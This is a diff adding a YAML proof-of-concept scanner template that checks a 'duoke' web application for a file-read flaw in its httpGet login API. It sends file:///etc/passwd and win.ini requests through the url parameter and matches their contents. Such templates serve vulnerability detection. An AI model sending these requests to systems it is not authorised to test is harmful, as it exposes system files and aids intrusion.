@@ -1,0 +1,24 @@
+name: poc-yaml-duoke-httpGet-File-reading
+transport: http
+
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /index.php/api/login/httpGet?url=file:///etc/passwd
+        expression: response.status == 200 && response.body.bcontains(b'root:')
+    r1:
+        request:
+            method: GET
+            path: /index.php/api/login/httpGet?url=file://C:/windows/win.ini
+        expression: response.status == 200 && response.body.bcontains(b'; for 16-bit app support')
+expression: r0() || r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139546058
+
+# body="/static/index/js/jweixin-1.2.0.js"
